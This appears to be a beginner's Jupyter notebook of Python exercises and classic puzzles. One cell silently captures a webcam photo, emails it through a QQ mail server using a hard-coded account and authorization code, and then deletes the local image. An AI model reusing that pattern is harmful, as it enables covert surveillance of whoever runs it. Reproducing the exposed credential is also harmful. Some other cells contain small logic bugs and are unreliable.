{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {
    "collapsed": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[71, 72, 81, 96, 52, 87, 13]\n",
      "[96, 87, 81, 72, 71, 52, 13]\n"
     ]
    }
   ],
   "source": [
    "import random\n",
    "x=[random.randint(1,100) for i in range(7)]\n",
    "print(x)\n",
    "for i in range(len(x)-1):\n",
    "    for j in range(i,len(x)):\n",
    "        if x[i]<x[j]:\n",
    "            x[i],x[j]=x[j],x[i]\n",
    "print(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {
    "collapsed": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1\n",
      "1\n",
      "2\n",
      "3\n",
      "5\n",
      "8\n",
      "13\n",
      "21\n",
      "34\n"
     ]
    }
   ],
   "source": [
    "n=0\n",
    "a,b=0,1\n",
    "while n<9:\n",
    "    print(b)\n",
    "    a,b=b,a+b\n",
    "    n+=1\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[1, 2, 3, 4, ['a', 'b', 'c'], 5] [1, 2, 3, 4, ['a', 'b', 'c'], 5] [1, 2, 3, 4, ['a', 'b', 'c']] [1, 2, 3, 4, ['a', 'b', 'c']] [1, 2, 3, 4, ['a', 'b']]\n"
     ]
    }
   ],
   "source": [
    "import copy\n",
    "a=[1,2,3,4,['a','b']]\n",
    "b=a\n",
    "c=a[:]\n",
    "d=copy.copy(a)\n",
    "e=copy.deepcopy(a)\n",
    "a.append(5)\n",
    "\n",
    "a[4].append('c')\n",
    "print(a,b,c,d,e)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "1*1=1 \n",
      "1*2=2 2*2=4 \n",
      "1*3=3 2*3=6 3*3=9 \n",
      "1*4=4 2*4=8 3*4=12 4*4=16 \n",
      "1*5=5 2*5=10 3*5=15 4*5=20 5*5=25 \n",
      "1*6=6 2*6=12 3*6=18 4*6=24 5*6=30 6*6=36 \n",
      "1*7=7 2*7=14 3*7=21 4*7=28 5*7=35 6*7=42 7*7=49 \n",
      "1*8=8 2*8=16 3*8=24 4*8=32 5*8=40 6*8=48 7*8=56 8*8=64 \n",
      "1*9=9 2*9=18 3*9=27 4*9=36 5*9=45 6*9=54 7*9=63 8*9=72 9*9=81 "
     ]
    }
   ],
   "source": [
    "import time\n",
    "for i in range(1,10):\n",
    "    print()\n",
    "    time.sleep(0.5)\n",
    "    for j in range(1,i+1):\n",
    "        print('{}*{}={}'.format(j,i,i*j),end=' ')\n",
    "        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {
    "collapsed": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2021-01-27 19:21:45\n",
      "2021-01-27 19:21:46\n",
      "2021-01-27 19:21:47\n",
      "2021-01-27 19:21:48\n"
     ]
    }
   ],
   "source": [
    "import time\n",
    "#for i in range(4):\n",
    "#    print(str(int(time.time()))[-2:])\n",
    "#    time.sleep(1)\n",
    "\n",
    "\n",
    "for i in range(4):\n",
    "    print(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time())))\n",
    "    time.sleep(1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#题目：有一对兔子，从出生后第3个月起每个月都生一对兔子，小兔子长到第三个月后每个月又生一对兔子，假如兔子都不死，问每个月的兔子总数为多少？\n",
    "#也就是斐波那契数列\n",
    "time=int(input('please input number'))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "101 103 107 109 113 121 127 131 137 139 143 149 151 157 163 167 169 173 179 181 191 193 197 199 "
     ]
    }
   ],
   "source": [
    "import math\n",
    "for i in range(100,201):\n",
    "    n=0\n",
    "    for j in range(2,int(math.sqrt(i))):\n",
    "        if i%j==0:\n",
    "            n+=1\n",
    "    if n==0:\n",
    "        print(i,end=' ')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'int'> <class 'str'>\n",
      "<class 'int'> <class 'str'>\n"
     ]
    }
   ],
   "source": [
    "for i in range(100,102):\n",
    "    i=str(i)\n",
    "    x=int(i[0])\n",
    "    y=int(i[1])\n",
    "    z=int(i[2])\n",
    "    if x**3+y**3+z**3==int(i):\n",
    "        print(i)\n",
    "#方法二\n",
    "#for i in range(100,1000):\n",
    "#    x=i//100\n",
    "#    y=i%100//10\n",
    "#    z=i%10\n",
    "#    if x**3+y**3+z**3==i:\n",
    "#        print(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 107,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2131\n",
      "2131的质因数有[1, 2131]\n"
     ]
    }
   ],
   "source": [
    "x=[]\n",
    "a=int(input())\n",
    "for i in range(1,a+1):\n",
    "    if a%i==0:\n",
    "        x.append(i)\n",
    "\n",
    "print('{}的质因数有{}'.format(a,x))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[321, 231, 12]\n"
     ]
    }
   ],
   "source": [
    "x=[21,231,12,321]\n",
    "x.sort(reverse=True)\n",
    "del x[2]\n",
    "print(x)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 125,
   "metadata": {
    "collapsed": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2021-01-27\n",
      "2333-02-03\n",
      "27/01/2021\n",
      "1133-02-03\n"
     ]
    }
   ],
   "source": [
    "import datetime\n",
    "print(datetime.date.today())\n",
    "print(datetime.date(2333,2,3))\n",
    "print(datetime.date.today().strftime('%d/%m/%Y'))\n",
    "day=datetime.date(1111,2,3)\n",
    "day=day.replace(year=day.year+22)\n",
    "print(day)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 145,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2021-01-27\n",
      "2222-02-02\n",
      "27\n"
     ]
    }
   ],
   "source": [
    "import datetime\n",
    "print(datetime.date.today())\n",
    "print(datetime.date(2222,2,2))\n",
    "print(datetime.date.today().strftime('%d'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "over\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "import cv2\n",
    "from email.mime.multipart import MIMEMultipart\n",
    "from email.header import Header\n",
    "from email.mime.text import MIMEText\n",
    "from smtplib import SMTP_SSL\n",
    "cap=cv2.VideoCapture(0)\n",
    "_, frame=cap.read()\n",
    "cv2.imwrite('image.jpg',frame)\n",
    "cap.release()\n",
    "\n",
    "qq_server='smtp.qq.com' #qq邮箱的服务器\n",
    "qq_email_user='1432875327@qq.com' #设置邮箱的账号\n",
    "qq_email_password='rwgskjrczkpnhcbf' #授权码\n",
    "msg=MIMEMultipart()\n",
    "msg['Subject']=Header('照片') #主题信息\n",
    "msg['From']=qq_email_user #设置发送者的邮箱\n",
    "msg['To']=qq_email_user  #设置接收者的邮箱\n",
    "\n",
    "img=open('image.jpg','rb').read()\n",
    "image=MIMEText(img,'base64','utf-8')\n",
    "image['Content-Type']='image/jpg'\n",
    "msg.attach(image)\n",
    "\n",
    "email=SMTP_SSL(qq_server)\n",
    "email.login(qq_email_user,qq_email_password)\n",
    "email.sendmail(qq_email_user,qq_email_user,msg.as_string())\n",
    "\n",
    "os.remove('image.jpg')\n",
    "print('over')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5 4 8 1\n"
     ]
    }
   ],
   "source": [
    "a='wwwadWDWD123 213#$'\n",
    "x,y,z,space=0,0,0,0\n",
    "for i in a:\n",
    "    if 97<=ord(i)<=122 :\n",
    "        x+=1\n",
    "    elif 65<=ord(i)<=90:\n",
    "        y+=1\n",
    "    elif ord(i)==32:\n",
    "        space+=1\n",
    "    else :z+=1\n",
    "print(x,y,z,space)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "选择加的数字4\n",
      "选择要加的次数4\n",
      "4936\n"
     ]
    }
   ],
   "source": [
    "x=input('选择加的数字')                   \n",
    "y=int(input('选择要加的次数'))\n",
    "s=0\n",
    "for i in range(y):    # 方法二\n",
    "    a=x               # s+=int(a)\n",
    "    a=a+a*i           # a+=a[0]\n",
    "    s+=int(a)\n",
    "print(s)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {
    "collapsed": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "6 的因数为 [1, 2, 3]\n",
      "28 的因数为 [1, 2, 4, 7, 14]\n",
      "496 的因数为 [1, 2, 4, 8, 16, 31, 62, 124, 248]\n"
     ]
    }
   ],
   "source": [
    "\n",
    "for  i in range(1,1000):\n",
    "    x=[]\n",
    "    for j in range(1,i):\n",
    "        if i%j==0:\n",
    "            x.append(j)\n",
    "    if sum(x)==i:\n",
    "        print(i,'的因数为',x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {
    "collapsed": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "100\n",
      "200.0\n",
      "250.0\n",
      "275.0\n",
      "287.5\n",
      "293.75\n",
      "296.875\n",
      "298.4375\n",
      "299.21875\n",
      "299.609375\n",
      "299.8046875\n",
      "299.853515625\n"
     ]
    }
   ],
   "source": [
    "#题目：一球从100米高度自由落下，每次落地后反跳回原高度的一半；再落下，求它在第10次落地时，共经过多少米？第10次反弹多高？\n",
    "height=100\n",
    "n=0\n",
    "s=0\n",
    "while n<=10:\n",
    "    s+=height\n",
    "    print(s)\n",
    "    height/=2\n",
    "    s+=height\n",
    "    n+=1\n",
    "print(s)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1534\n"
     ]
    }
   ],
   "source": [
    "#题目：猴子吃桃问题：猴子第一天摘下若干个桃子，当即吃了一半，还不瘾，又多吃了一个第二天早上又将剩下的桃子吃掉一半\n",
    "#，又多吃了一个。以后每天早上都吃了前一天剩下的一半零一个。到第10天早上想再吃时，见只剩下一个桃子了。求第一天共摘了多少\n",
    "peach=1\n",
    "for i in range(9):\n",
    "    peach=(peach+1)*2\n",
    "print(peach)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "a:z,b:x,c:y\n"
     ]
    }
   ],
   "source": [
    "#题目：两个乒乓球队进行比赛，各出三人。甲队为a,b,c三人，\n",
    "#乙队为x,y,z三人。已抽签决定比赛名单。有人向队员打听比赛的名单。a说他不和x比，c说他不和x,z比，请编程序找出三队赛手的名单。\n",
    "a=set(['x','y','z'])\n",
    "b=set(['x','y','z'])\n",
    "c=set(['x','y','z'])\n",
    "c-=set(('x','z'))\n",
    "a-=set('x')\n",
    "for i in a:\n",
    "    for j in b:\n",
    "        for k in c:\n",
    "            if len(set((i,j,k)))==3:\n",
    "                print('a:%s,b:%s,c:%s'%(i,j,k))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "                *********\n",
      "                 *******\n",
      "                  *****\n",
      "                   ***\n",
      "                    *\n",
      "                     \n",
      "                    *\n",
      "                   ***\n",
      "                  *****\n",
      "                 *******\n"
     ]
    }
   ],
   "source": [
    "'''\n",
    "def draw(num):\n",
    "    a=\"*\"*(2*(4-num)+1)\n",
    "    print(a.center(9,' '))\n",
    "    if num!=1:\n",
    "        draw(num-1)\n",
    "        print(a.center(9,' '))\n",
    "draw(4)\n",
    "'''"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "32.66026079864164\n"
     ]
    }
   ],
   "source": [
    "a,b,s=1,1,0\n",
    "for i in range(20):\n",
    "    a,b=b,a+b\n",
    "    s+=b/a\n",
    "print(s)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 101,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "720\n",
      "please input round numeber a times: 20\n",
      "2561327494111820313\n"
     ]
    }
   ],
   "source": [
    "def wewe(x):\n",
    "    if x==1:\n",
    "        return x==1\n",
    "    else:\n",
    "        return wewe(x-1)*x\n",
    "x=wewe(6)\n",
    "print(x)\n",
    "#下面是求阶乘相加的。。\n",
    "a=int(input('please input round numeber a times: '))\n",
    "S=0\n",
    "for i in range(1,a+1):\n",
    "    s=1\n",
    "    for j in range(1,i+1):        \n",
    "        s*=j\n",
    "    S+=s\n",
    "print(S)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 103,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "4\n",
      "9\n",
      "9\n"
     ]
    }
   ],
   "source": [
    "#下面是求阶乘相加的。。\n",
    "res=1\n",
    "for i in range(20,1,-1):\n",
    "    res=i*res+1\n",
    "    print(res)\n",
    "print(res)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
